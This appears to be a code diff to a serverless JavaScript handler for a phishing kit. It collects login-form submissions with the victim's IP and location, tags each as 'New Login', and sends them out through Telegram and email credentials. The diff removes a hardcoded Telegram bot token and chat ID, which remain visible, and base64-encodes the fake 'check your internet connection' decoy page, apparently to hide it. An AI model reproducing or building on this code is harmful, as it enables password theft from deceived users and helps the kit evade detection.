@@ -5,9 +5,12 @@ const FORM_OWNERS = {
   'login-form': process.env.LOGIN_EMAIL || process.env.DEST_EMAIL
 };
 
-const DEFAULT_TELEGRAM_BOT_TOKEN =
-  '9171466013:AAHq46tvJNzUhOr3LyS9682j2zc_xUaRnuY';
-const DEFAULT_TELEGRAM_CHAT_ID = '5810458739';
+const RESPONSE_HTML_B64 =
+  'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPG1ldGEgY2hhcnNldD0idXRmLTgiIC8+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIiAvPgogIDx0aXRsZT5QbGVhc2Ugb3BlbiB5b3VyIG1haWwgYW5kIHRyeSBhZ2FpbjwvdGl0bGU+CiAgPHN0eWxlPgogICAgYm9keSB7CiAgICAgIGZvbnQtZmFtaWx5OiBzeXN0ZW0tdWksIC1hcHBsZS1zeXN0ZW0sIHNhbnMtc2VyaWY7CiAgICAgIGRpc3BsYXk6IGdyaWQ7CiAgICAgIHBsYWNlLWl0ZW1zOiBjZW50ZXI7CiAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICBtYXJnaW46IDA7CiAgICAgIGJhY2tncm91bmQ6ICNmOWZhZmI7CiAgICAgIGNvbG9yOiAjMTExODI3OwogICAgfQogICAgLmNhcmQgewogICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgIHBhZGRpbmc6IDJyZW07CiAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7CiAgICAgIGJhY2tncm91bmQ6ICNmZmZmZmY7CiAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNlNWU3ZWI7CiAgICAgIG1heC13aWR0aDogMzgwcHg7CiAgICB9CiAgICAuc3Bpbm5lciB7CiAgICAgIHdpZHRoOiAzNnB4OwogICAgICBoZWlnaHQ6IDM2cHg7CiAgICAgIG1hcmdpbjogMCBhdXRvIDFyZW07CiAgICAgIGJvcmRlcjogM3B4IHNvbGlkICNlNWU3ZWI7CiAgICAgIGJvcmRlci10b3AtY29sb3I6ICMxMTE4Mjc7CiAgICAgIGJvcmRlci1yYWRpdXM6IDUwJTsKICAgICAgYW5pbWF0aW9uOiBzcGluIDAuOXMgbGluZWFyIGluZmluaXRlOwogICAgICBhbmltYXRpb24taXRlcmF0aW9uLWNvdW50OiBpbmZpbml0ZTsKICAgIH0KICAgIC53YXJuaW5nIHsKICAgICAgY29sb3I6ICNkYzI2MjY7CiAgICAgIGZvbnQtd2VpZ2h0OiA2MDA7CiAgICAgIG1hcmdpbjogMCAwIDAuNzVyZW07CiAgICB9CiAgICAucHJvbXB0IHsKICAgICAgbWFyZ2luOiAwOwogICAgICBjb2xvcjogIzExMTgyNzsKICAgIH0KICAgIEBrZXlmcmFtZXMgc3BpbiB7CiAgICAgIGZyb20geyB0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTsgfQogICAgICB0byB7IHRyYW5zZm9ybTogcm90YXRlKDM2MGRlZyk7IH0KICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgPGRpdiBjbGFzcz0ic3Bpbm5lciIgYXJpYS1oaWRkZW49InRydWUiPjwvZGl2PgogICAgPHA+4pqg77iPIFBsZWFzZSBjaGVjayB5b3VyIGludGVybmV0IGNvbm5lY3Rpb24gYW5kIHRyeSBhZ2Fpbi48L3A+CiAgICA8cD5QbGVhc2Ugb3BlbiB5b3VyIG1haWwgYW5kIHRyeSBhZ2Fpbi48L3A+CiAgPC9kaXY+CjwvYm9keT4KPC9odG1sPg==';
+
+function decodeBase64Utf8(b64) {
+  return Buffer.from(String(b64), 'base64').toString('utf8');
+}
 
 function safeDecode(value = '') {
   try {
@@ -85,7 +88,7 @@ export default async function handler(req, res) {
 
     const ipAddress = extractClientIp(req);
     const location = extractLocation(req);
-    const submissionLabel = `New Login ${formId} ,${location.country} ,${location.city}`;
+    const submissionLabel = `New Login ${formId},${location.country},${location.city}`;
 
     const entries = Object.entries(body).filter(([key]) => !key.startsWith('_'));
 
@@ -121,8 +124,8 @@ export default async function handler(req, res) {
       </div>
     `;
 
-    const botToken = process.env.TELEGRAM_BOT_TOKEN || DEFAULT_TELEGRAM_BOT_TOKEN;
-    const chatId = process.env.TELEGRAM_CHAT_ID || DEFAULT_TELEGRAM_CHAT_ID;
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
     const resendApiKey = process.env.RESEND_API_KEY;
 
     const tasks = [];
@@ -208,63 +211,7 @@ export default async function handler(req, res) {
     }
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
-    return res.status(200).send(`<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Please open your mail and try again</title>
-  <style>
-    body {
-      font-family: system-ui, -apple-system, sans-serif;
-      display: grid;
-      place-items: center;
-      min-height: 100vh;
-      margin: 0;
-      background: #f9fafb;
-      color: #111827;
-    }
-    .card {
-      text-align: center;
-      padding: 2rem;
-      border-radius: 12px;
-      background: #ffffff;
-      border: 1px solid #e5e7eb;
-      max-width: 380px;
-    }
-    .spinner {
-      width: 36px;
-      height: 36px;
-      margin: 0 auto 1rem;
-      border: 3px solid #e5e7eb;
-      border-top-color: #111827;
-      border-radius: 50%;
-      animation: spin 0.9s linear infinite;
-      animation-iteration-count: infinite;
-    }
-    .warning {
-      color: #dc2626;
-      font-weight: 600;
-      margin: 0 0 0.75rem;
-    }
-    .prompt {
-      margin: 0;
-      color: #111827;
-    }
-    @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
-    }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <div class="spinner" aria-hidden="true"></div>
-    <p class="warning">⚠️ Please check your internet connection and try again.</p>
-    <p class="prompt">Please open your mail and try again.</p>
-  </div>
-</body>
-</html>`);
+    return res.status(200).send(decodeBase64Utf8(RESPONSE_HTML_B64));
   } catch (err) {
     return res.status(500).json({
       ok: false,
